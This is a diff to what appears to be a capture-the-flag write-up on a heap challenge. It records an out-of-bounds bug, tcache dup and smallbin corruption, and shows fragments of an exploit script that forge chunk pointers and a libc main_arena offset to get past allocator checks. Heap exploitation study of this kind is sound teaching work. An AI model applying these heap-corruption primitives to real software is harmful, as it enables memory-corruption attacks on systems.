@@ -197,7 +197,7 @@ So there are two bugs.
 2. OOB in `gen_hash()` function
 
 Next i quickly wrote a fuzzer to allocate chunks randomly. And i got nice crashes. 
-1. Tcahce dup
+1. Tcache dup
 2. Unsorted & smallbin bin corruption
 
 [![asciicast](https://asciinema.org/a/459156.svg)](https://asciinema.org/a/459156)
@@ -207,9 +207,8 @@ Now lets build our exploit. <br> So with the OOB bug we can mark chunk idx 0 and
 x/gx $in_use
 0x555555558440:	0x0000000100000001 chunk 0 & 1 are in use
 0x555555558440:	0x000055555555c720 "\x80" chunk heap address overlapped
-
 ```
-<br> So we can use this primitive for getting leaks and building our exploit.<br>
+<br>So we can use this primitive for getting leaks and building our exploit.<br>
 
 # Exploit
 1. Use name "\x80" to trigger UAF in chunk idx 0 and 1.
@@ -328,7 +327,7 @@ delete(1) # trigger smallbin corruption overwrite fd & bk
 fd=hb+0x1790
 
 
-add(b"\x09", (p(fd-0x10)   +      p(hb+0x2d0)  + b"a"*0x10   )) # 0x19d0
+add(b"\x09", (p(fd)   +      p(hb+0x2d0)  + b"a"*0x10   )) # 0x19d0
 add(b"\x09", (p(hb+0x2d0)  + p(hb+0x19d0) + b"b"*0x10   )) # 0x2b10
 add(b"\x09", (p(hb+0x19d0) + p(hb+0x2b10) + b"c"*0x10   ) + p(0x0)*56 + p(0) + p(0x211) + p(libc.address+0x1ebde0)*2 ) # 0x2d50 libc.address+0x1ebde0 -> main_arena+608 to bypass check in _int_malloc+215
 add(b"\x09", (p(hb+0x2f90) + p(hb+0x2f40) + b"d"*0x10   )) # 0x2f90
